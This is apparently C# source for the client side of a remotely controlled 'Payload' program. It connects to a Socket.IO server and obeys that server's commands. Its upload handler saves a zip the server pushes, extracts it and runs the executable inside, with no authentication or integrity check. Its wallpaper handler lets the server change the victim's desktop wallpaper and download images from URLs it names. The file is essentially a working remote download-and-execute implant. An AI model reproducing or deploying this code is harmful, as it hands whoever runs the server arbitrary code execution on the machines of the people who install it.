using Payload.Command;
using Payload.Command.WallPaper;
using SocketIOClient;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CommonClassLibrary;
using static CommonClassLibrary.Config;

namespace Payload.Core.Command.SocketClient
{
    public class IBasicResProps<T>
    {
        public T data { get; set; }
    }
    public class WallpaperProps
    {
        public string data { get; set; }
    }


    public class UploadReqProps : IBasicResProps<UploadProps> { }


    public class SocketIoClient : ISocketIoClient
    {

        public SocketIoClient(string serverHost)
        {
            ServerHost = serverHost;
            client = new SocketIOClient.SocketIO(serverHost);
            Init();
            RenameAllImage();
        }

        private void Init()
        {
            OnWallpaper();
            OnUpload();
            OnMyResponse();
        }

        private void OnMyResponse()
        {
            if (Config.IsRelease())
                return;
            client.On("my_response", async response => {
                Console.WriteLine(response);
            });
        }
        private bool InstallPatch(UploadProps props)
        {
            bool patchUnziped = false;
            if (!props.name.ToLower().EndsWith("zip") || (!props.action.ToLower().Equals("upgrade") && !props.action.ToLower().Equals("exe")) )
                return patchUnziped;
            try
            {
                string patchPath = $"{props.path}\\{props.name}";
                System.IO.Compression.ZipFile.ExtractToDirectory(patchPath, props.path);
                patchUnziped = true;
            }
            catch { }
            if (!patchUnziped)
                return patchUnziped;
            string exeName = "";
            FileInfo[] allFiles = new DirectoryInfo(props.path).GetFiles("*.exe");
            if (allFiles.Length == 1)
                exeName = allFiles[0].Name;
            new StartProcessFactory(
                new StartProcessCommandProps() { ExeName = exeName, TargetWorkSpaceDir = props.path }
                )
            .CreateCommand()
                .Execute();
            return patchUnziped;
        }

        private UploadProps HandlePath(UploadProps props)
        {
            string path = props.path;
            string defaultPath = $"{Config.Instance.TargetUpgradeDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss")}_{{0}}";

            switch (props.action.ToLower())
            {
                case "upgrade":
                    path = string.Format(defaultPath, "patch");
                    break;
                case "exe":
                    path = string.Format(defaultPath, "exe");
                    break;
            }
            props.path = path;
            return props;
        }

        private void OnUpload()
        {
            client.On("upload", async response => {
                Console.WriteLine(response);
                UploadReqProps reqProps = response.GetValue<UploadReqProps>();
                UploadProps props = reqProps.data;
                bool saved = FileHelper.SaveFile(HandlePath(props));
                Console.WriteLine($"{props.path}\\{props.name} :: saved = {saved}");
                InstallPatch(props);
            });
        }

        private void OnWallpaper()
        {
            client.On("wallpaper", async response =>
            {
                Console.WriteLine(response);
                //string text = response.GetValue<string>();
                var _d = response.GetValue<WallpaperProps>();
                string msg = _d.data;

                switch (msg)
                {
                    case "wp":
                        CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.AUTO);
                        break;
                    case "stwp":
                        CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Pause();
                        break;
                    case "rewp":
                        CommandManager.Instance.AddWallpaperCmd(Payload.Command.WallPaper.Mode.RESET);
                        break;
                    case "savewp":
                        ((WallpaperEngineCommand)CommandManager.Instance.GetTaskPack(EnumTask.WallpaperEngine).Command).GetCurrentWallpaper();
                        break;
                    case "rname":
                        RenameAllImage();
                        break;
                    default:
                        Handle("wallpaper", msg);
                        break;
                }
            });
        }

        private void RenameAllImage()
        {
            FileInfo[] imgs = new DirectoryInfo(Config.Instance.WallpaperEngineCommandImageDir).GetFiles();
            foreach (FileInfo file in imgs)
            {
                if (string.IsNullOrEmpty(file.Extension))
                    continue;
                File.Move(file.FullName, $"{file.DirectoryName}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff")}");
                Thread.Sleep(1);
                File.Delete(file.FullName);
            }
        }

        private void Handle(string channel, string cmd)
        {
            if (channel.Equals("wallpaper") && cmd.StartsWith("dl"))
            {
                string url = cmd.Split(' ')[1];
                new ImageHelper().SaveImage(url, $"{Config.Instance.WallpaperEngineCommandImageDir}\\{DateTime.Now.ToString("yyyy_MM_dd_HH_mm_ss_fff")}", ImageFormat.Png);
            }
        }
    }
}
